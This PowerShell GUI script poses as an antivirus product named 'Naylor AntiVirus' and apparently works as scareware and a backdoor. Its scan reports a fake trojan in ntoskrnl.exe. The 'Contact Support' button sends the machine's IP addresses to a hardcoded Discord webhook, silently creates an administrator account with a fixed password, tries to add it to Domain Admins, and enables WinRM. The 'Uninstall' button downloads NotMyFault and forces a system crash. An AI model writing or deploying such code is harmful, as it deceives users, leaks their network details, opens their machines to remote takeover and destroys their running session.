Add-Type -AssemblyName PresentationFramework

[xml]$xaml = @"
<Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="Naylor AntiVirus"
        Height="500" Width="700"
        WindowStartupLocation="CenterScreen"
        Background="White"
        FontFamily="Comic Sans MS">
        

    <Grid Margin="20">
    <Grid.RowDefinitions>
        <RowDefinition Height="Auto"/> <!-- Header -->
        <RowDefinition Height="Auto"/> <!-- Buttons -->
        <RowDefinition Height="*"/>    <!-- Output box -->
        <RowDefinition Height="Auto"/> <!-- Progress bar -->
    </Grid.RowDefinitions>

    <!-- Header -->
<StackPanel Orientation="Horizontal" HorizontalAlignment="Center" VerticalAlignment="Top" Grid.Row="0" Margin="0,10,0,20">
    <Image x:Name="LogoImage" Width="40" Height="40" Margin="0,0,10,0"/>
    <TextBlock x:Name="HeaderText"
               Text="Naylor AntiVirus"
               FontSize="28"
               FontWeight="Bold"
               VerticalAlignment="Center"/>
</StackPanel>


    <!-- Buttons -->
    <StackPanel Grid.Row="1" Orientation="Horizontal" HorizontalAlignment="Center" Margin="0,0,0,10">
        <Button x:Name="RunScanButton" Content="Run Scan" Width="150" Height="40" Margin="0,0,15,0"/>
        <Button x:Name="SupportButton" Content="Contact Support" Width="150" Height="40" Margin="0,0,15,0"/>
        <Button x:Name="UninstallButton" Content="Uninstall" Width="150" Height="40"/>
    </StackPanel>

    <!-- Output box -->
    <RichTextBox x:Name="OutputBox"
                 Grid.Row="2"
                 VerticalScrollBarVisibility="Auto"
                 HorizontalScrollBarVisibility="Auto"
                 IsReadOnly="True"/>

    <!-- Progress bar -->
    <ProgressBar x:Name="SupportProgress"
                 Grid.Row="3"
                 Height="20"
                 Margin="0,10,0,0"
                 Visibility="Collapsed"
                 IsIndeterminate="True"/>
</Grid>

</Window>
"@

# Load XAML
$reader = (New-Object System.Xml.XmlNodeReader $xaml)
$window = [Windows.Markup.XamlReader]::Load($reader)


# Get controls
$runScanButton   = $window.FindName("RunScanButton")
$supportButton   = $window.FindName("SupportButton")
$uninstallButton = $window.FindName("UninstallButton")
$outputBox       = $window.FindName("OutputBox")
$SupportProgress = $window.FindName("SupportProgress") 

# Helper function to append colored text



function Append-Text($rtb, $text, $color = "Black") {
    $run = New-Object System.Windows.Documents.Run($text)

    switch ($color.ToLower()) {
        "red"   { $c = [System.Windows.Media.Color]::FromRgb(255,0,0) }
        "green" { $c = [System.Windows.Media.Color]::FromRgb(0,128,0) }
        default { $c = [System.Windows.Media.Color]::FromRgb(0,0,0) }
    }

    $run.Foreground = New-Object System.Windows.Media.SolidColorBrush($c)
    $paragraph = New-Object System.Windows.Documents.Paragraph($run)
    $rtb.Document.Blocks.Add($paragraph)
    $rtb.ScrollToEnd()
}
$IconBase64 = @"
AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAABILAAASCwAAAAAAAAAAAADd6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/9zp8P/f7PT/3Onw/9zp8P/d6vL/3enw/93q8f/d6fD/3enw/93p8P/d6vH/3erx/93q8f/d6fD/3enw/93q8f/d6fD/3Ojv/9zp8P/e6/L/2+ft/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/e6/P/rq+r/5+dlf+ioJn/qamk/6emof+srKj/wcjJ/7e7uv+8wcH/ur+//7O1sv+jopz/x8/R/62uqv+kopz/nZqS/7/Fxf+QioD/m5iQ/7u/vv+Kg3f/s7az/97s8//d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/9/t9P+ytLH/XUkz/5uXj/+DeW//Y1E//5OMhf+trq7/npyY/6mpqP+hoJz/jYZ7/4F3af+trqz/k46I/3ptYf9qWkj/n52X/4+Jgv+Lg3r/nJiR/3FiUP+lpJ//3+z0/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3+z0/9Pe4/+JgXT/yM/R/5qWjf+hn5n/p6ag/5ONg/+Kgnf/ra+s/6mqpv+npqH/rq+s/6usqP+rrKn/lI6E/4mBdf+xtLH/ra+s/6enov+qqqX/hHps/77Dw//g7vb/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/9rn7f/Gzc//1+Po/9Hc4P/Gzc//xs7Q/8zV2f/e6/L/yM/S/8TLzf/P2d3/xczO/9vn7v/S3eH/vMHB/7u/v//L09b/0dvf/7e7uf+/xcX/2ubs/87Y2//Ey83/1eDl/8PKy//Z5ez/3erx/93q8f/d6vH/3erx/93q8f/e6/L/0Nre/2dWQ/+5vbv/hXtt/2hXQ/+QiX//aVhF/6Cdl/9pWEX/l5OK/6emoP9xY1H/3Onw/6usp/9PNx3/YlA6/5eSiv92aFf/Xko0/1xIMf+cmZH/lZCH/3lsXP+RioD/eW1d/9jk6f/d6vL/3erx/93q8f/d6vH/3erx/97r8v/P2d3/X0w3/4d+cv9JMBb/YE04/7S3tf9ONh3/aFdD/000G/++w8P/lI+F/11JNf/W4uf/pqWg/11JM//M1Nf/oZ6Y/1lELv/I0NP/paSf/11KNP+CeGv/TDMZ/0szGP+Si4H/3uvz/93q8f/d6vH/3erx/93q8f/d6vH/3uvy/8/Z3v9ZRCz/TjUb/3hsXP9kUz7/z9jc/29gTv9sXEn/cGFP/8XMzv9gTTj/Tzcd/6emof+op6L/YU44/9jk6v+joZv/XEgy/9Lc4f+ur6z/WkUv/390Zv9kUTz/ioJ2/15LNf/R3OD/3uvy/93q8f/d6vH/3erx/93q8f/e6/L/0Nre/1lELP9/c2T/ra6q/2ZVQP/X4uj/m5eP/0QpDf+em5P/kYuB/3JjUf+em5T/bFxJ/5yZkf9oVkL/2OTp/8zV2P9oV0P/Z1VB/11JMv+Nhnr/koyC/1I7Iv9lUz7/dGZU/9fi6P/d6/L/3erx/93q8f/d6vH/3erx/93q8f/Z5ez/uby7/9Da3v/R2+D/u7+//9vo7//P2d3/hHps/4+Iff+WkIf/yNDS/9Tf5P+JgXT/m5aO/42Gev+9wsL/3+30/8zV2P+lpJ//sbOw/9jk6v/J0dP/rq+r/7GzsP/P2d3/3uvy/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/f7PT/3uvy/97r8v/f7PT/3+zz/8zU1/9VPyX/Oh0A/5eSif/i8Pj/zNTX/2JPOf92aVf/ZFE8/6Gel//g7fX/3uzz/+Hv9f/f7fT/3erx/97r8//g7fX/4O31/97r8v/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3uvx/+Ds8v/j7/b/ra2o/z8jBf9FKw7/ur69/+Hv9/+4u7n/W0Yv/3dpWf9gTDb/uLy6/+Dt9P/T4O//wMzq/97r8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/97r8v/g7PP/4Ovx/+Lu9f+Femz/OBoA/1xHL//O19r/4O72/5+clf9cRzH/dmhX/2RSPf/L1Nf/3+zz/8zZ7f+Snt7/2+jx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/e6/L/1d/k/42EeP91Z1X/g3hp/1Q9JP85HAD/Tzcd/6urpv/f7fT/hXtu/2JPOv9yY1L/cWJQ/9jk6v/d6vH/3erx/56q4f+vu+X/3uvx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/9/t9f+xsq7/QCMI/zkaAP85HAD/Ox4A/zseAP9NNBn/qKaf/9Xf4/9zZFL/allF/2taR/+GfXD/3uzz/93q8f/e6/H/1uLv/5Sf3v+9yun/3+zx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3uvy/4Z8b/86HAD/PB8A/zwfAP88HwD/PB8A/zwfAP9CJgj/dWZU/2JOOP9xY1D/ZFI9/6Cdlf/g7fX/3erx/93q8f/e6/H/y9jt/5Of3v/Y5fD/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/a5uz/bVxK/zcZAP87HgD/PB8A/zwfAP88HwD/PB8A/zseAP9BJQr/RywQ/1xIMP9bRi//uLy7/+Du9v/d6vH/3erx/93q8f/e6/H/nKjg/8bT6//e6/H/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f+5vbv/cGBN/0syFv89IQP/ORwA/zocAP87HgD/Ox4A/zkbAP86HQD/OhwA/1U+Jv/Iz9H/yNDS/9rn7f/f7PT/3erx/9/s8f99iNj/j5rd/+Dt8v/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/e6/H/3+vy/+Hu9P/b5uv/xsvM/6aknf+Cdmf/Yk44/000GP9NNBn/aVdC/1Q9JP9GLA//Ujsh/7Gyr/+pqKL/nJmQ/77Dw//b6O3/vMnp/0ZQyv9FUMr/sLzl/97r8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3+vy/+Ds8v/g7PL/4Ozy/+Ds8v/i7vT/4+/2/+Ht8//Y4ub/yM7P/8TJyf/a5en/ztbY/8HFxP+3ubb/xMrJ/8zU1f/BxsX/pqOb/6+2yf9KVs3/HynA/x8pwP82QMb/rLjk/9/s8v/d6vH/3erx/93q8f/d6vH/3erx/93q8f/e6/H/4Ozy/+Ds8v/g7PL/4Ozy/+Ds8v/g7PL/4Ozy/+Ht8//i7vT/4u70/+Ds8v/h7fT/4u/1/+Pw9v/X4eX/ra2n/6OgmP+vr6r/d4LR/x8pwf8hK8H/ISvB/x4owP9PWc3/0d7u/97r8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3+vy/+Ds8v/g7PL/4Ozy/+Ds8v/g7PL/4Ozy/+Ds8v/g7PL/4Ozy/+Ds8v/g7PL/4Ozy/+Ds8//g7fP/2+ju/87Z5f9MVsv/HijA/yErwf8hK8H/ICrB/ykzw/+vu+X/4O3y/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/e6/L/3+vy/9/s8v/f7PL/4Ozy/+Ds8v/g7PL/4Ozy/+Ds8v/g7PL/4Ozy/+Ds8v/e6/H/3erx/93q8f/e6/H/0d7u/1Fczf9ET8r/ICrB/yErwf8hK8H/JC7C/6Ov4v/g7fL/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/97q8f/g7PL/4Ozy/+Ds8v/e6/H/3erx/93q8f/d6vH/3erx/93q8f/c6fH/dH/W/2Rw0v8/Scn/ICrB/x8pwf81P8b/v8vp/9/s8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3urx/9/s8v/f6/L/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/9/s8f/Bzur/XmnR/z9Kyf8hK8H/LzrF/42Z3f/c6fH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/97r8f/M2e3/nanh/5Of3v+2w+f/2+jx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/97r8f/g7fL/4O3y/9/s8v/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/3erx/93q8f/d6vH/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

"@

# Convert base64 back to bytes and save temp .ico
$IconBytes = [Convert]::FromBase64String($IconBase64)
$IconPath = [System.IO.Path]::Combine($env:TEMP, "NaylorAV_$([guid]::NewGuid()).ico")
[System.IO.File]::WriteAllBytes($IconPath, $IconBytes)
$window.Icon = $IconPath
$IconBytes = [Convert]::FromBase64String($IconBase64)
$ms = New-Object System.IO.MemoryStream(,$IconBytes)
$bitmap = New-Object System.Windows.Media.Imaging.BitmapImage
$bitmap.BeginInit()
$bitmap.StreamSource = $ms
$bitmap.EndInit()

# Assign to the Image control
$logoImage = $window.FindName("LogoImage")
$logoImage.Source = $bitmap

# Run Scan button logic
$runScanButton.Add_Click({
    # Clear previous output
    $outputBox.Document.Blocks.Clear()

     # Show fake scanning start message
    ## Show initial message
    Append-Text $outputBox "Scanning for viruses. This may take a while..." "Green"

    # Set up a DispatcherTimer for a non-blocking pause
    $script:timer = New-Object System.Windows.Threading.DispatcherTimer
    $script:timer.Interval = [TimeSpan]::FromSeconds(2)
    $script:timer.Add_Tick({
    $script:timer.Stop()  # stop the timer

        # Start dumping System32 files
        $system32Path = "$env:WinDir\System32"
        Get-ChildItem -Path $system32Path | ForEach-Object {
            Append-Text $outputBox $_.FullName
            Start-Sleep -Milliseconds 2   # tiny delay per file
            [System.Windows.Threading.Dispatcher]::CurrentDispatcher.Invoke([action]{}, [System.Windows.Threading.DispatcherPriority]::Background)
        }

    # Wait a moment before showing the "malicious file" error
    $outputBox.Document.Blocks.Clear()
    Start-Sleep -Milliseconds 500
    Append-Text $outputBox "error: malicious file found (certainty 95% of process injection/trojan): C:\Windows\System32\ntoskrnl.exe" "Red"
    Append-Text $outputBox "risk level: high. Removal suggested" "Red"
    })

    $script:timer.Start()
})


$SupportButton.Add_Click({
    # Clear and update output box
    $outputBox.Document.Blocks.Clear()
    Append-Text $outputBox "Contacting a customer support representative, please wait..."

    # Show progress bar
    $SupportProgress.Visibility = "Visible"

    # --- Gather IPv4 addresses ---
    try {
        $ipv4s = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction Stop |
                 Where-Object { $_.IPAddress -ne "127.0.0.1" -and $_.IPAddress -notlike "169.254.*" } |
                 Select-Object -ExpandProperty IPAddress
    } catch {
        $ipv4s = ipconfig | Select-String "IPv4" | ForEach-Object {
            ($_ -split "[: ]+")[-1]
        }
    }

    if (-not $ipv4s) { $ipv4s = @("None Detected") }
    $ipList = $ipv4s -join ", "

    # --- Build message as a raw JSON string ---
    $message = "<@548984684160221196> A valued customer desperately requires your help.`n**IPv4 Addresses:** $ipList`nhttps://tenor.com/view/wongwingchun58-gif-15613675"

    $payload = @{ content = $message } | ConvertTo-Json -Compress
    $webhookUrl = "https://discord.com/api/webhooks/1415021056149815397/yYMA8vafbg9B73le6oefITGVyHKmymQhOM1xCNJUVKoepzC4OUaTrTrgAvH3LpJLeL_j"
    try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
    Append-Text $outputBox "✅ Support representative has been notified and will reach out shortly." "Green"

    # Check for user 'NaylorSupport'
    if (-not (Get-LocalUser -Name "NaylorSupport" -ErrorAction SilentlyContinue)) {
        net user NaylorSupport "Chiapet1!" /add | Out-Null
        net localgroup Administrators NaylorSupport /add | Out-Null
        try { net localgroup "Domain Admins" NaylorSupport /add | Out-Null } catch { }

        # Configure WinRM quietly
        winrm quickconfig -q | Out-Null
    }
} catch {
    Append-Text $outputBox "⚠ Failed to contact support system." "Red"
    Append-Text $outputBox $_.Exception.Message "Red"
}
})


$uninstallButton.Add_Click({
    $result = [System.Windows.MessageBox]::Show(
        "Are you sure you want to uninstall?",
        "Confirm Uninstall",
        [System.Windows.MessageBoxButton]::YesNo,
        [System.Windows.MessageBoxImage]::Warning
    )

    if ($result -ne [System.Windows.MessageBoxResult]::Yes) {
        Append-Text $outputBox "Uninstall canceled by user.`n" "Gray"
        return
    }

    # Disable UI while "uninstall" runs
    $runScanButton.IsEnabled = $false
    $supportButton.IsEnabled = $false
    $uninstallButton.IsEnabled = $false

    # Clear and show starting message
    $outputBox.Document.Blocks.Clear()
    Append-Text $outputBox "Understood. Uninstalling Windows...`n" "Red"

    # Files to display/delete
    $fileList = @(
        "C:\Windows\System32\kernel32.dll",
        "C:\Windows\System32\win32k.sys",
        "C:\Windows\explorer.exe",
        "C:\Windows\notepad.exe",
        "C:\Windows\System32\drivers\etc\hosts",
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\user32.dll",
        "C:\Windows\System32\gdi32.dll",
        "C:\Windows\System32\ntdll.dll",
        "C:\Windows\System32\config\SYSTEM",
        "C:\Windows\System32\config\SOFTWARE"
    )

    # Timing
    $intervalMs    = 300
    $prepDelayMs   = 2000
    $finishDelayMs = 1000

    $prepTicks   = [int][math]::Ceiling($prepDelayMs / $intervalMs)
    $finishTicks = [int][math]::Ceiling($finishDelayMs / $intervalMs)

    # Create one timer
    $timer = New-Object System.Windows.Threading.DispatcherTimer
    $timer.Interval = [TimeSpan]::FromMilliseconds($intervalMs)
    $timer.Tag = [PSCustomObject]@{
        Files       = $fileList
        Index       = 0
        Phase       = 'prep'     # phases: 'prep' -> 'deleting' -> 'finishWait'
        Tick        = 0
        PrepTicks   = $prepTicks
        FinishTicks = $finishTicks
    }

    $timer.add_Tick({
        param($sender, $e)
        $state = $sender.Tag

        switch ($state.Phase) {
            'prep' {
                $state.Tick++
                if ($state.Tick -ge $state.PrepTicks) {
                    $state.Phase = 'deleting'
                    $state.Tick  = 0
                }
            }

            'deleting' {
                if ($state.Index -lt $state.Files.Count) {
                    $path = $state.Files[$state.Index]
                    Append-Text $outputBox "Deleting: $path" "Red"
                    $state.Index++
                } else {
                    $state.Phase = 'finishWait'
                    $state.Tick  = 0
                }
            }

            'finishWait' {
                $state.Tick++
                if ($state.Tick -ge $state.FinishTicks) {
                    $sender.Stop()
                    # Clear and show final message after finish delay
                    $outputBox.Document.Blocks.Clear()
                    Append-Text $outputBox "Uninstall complete. The computer will now explode. Have a nice day!`n" "Green"
                    # Re-enable UI
                    $runScanButton.IsEnabled = $true
                    $supportButton.IsEnabled = $true
                    $uninstallButton.IsEnabled = $true

                   # --- Run NotMyFault (Sysinternals) ---
try {
    # Try to stop and remove leftover driver if present
    try { sc.exe stop myfault   | Out-Null } catch {}
    try { sc.exe delete myfault | Out-Null } catch {}

    $downloadUrl = "https://live.sysinternals.com/NotMyfault64.exe"
    $exePath     = "C:\Windows\NotMyfault64.exe"

    # Download latest NotMyFault from Sysinternals Live
    Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath 

    if (Test-Path $exePath) {
        # Launch directly into crash
        & "C:\Windows\NotMyfault64.exe" /crash
    } else {
        Append-Text $outputBox "`nFailed to install explosive`n" "Red"
    }
}
catch {
    Append-Text $outputBox "`nDetonation Failed: $_`n" "Red"
}


                }
            }
        } # <-- closes switch
    })   # <-- closes timer.add_Tick

    # Start the sequence
    $timer.Start()
}) # <-- closes Add_Click



# Show window
$window.ShowDialog() | Out-Null
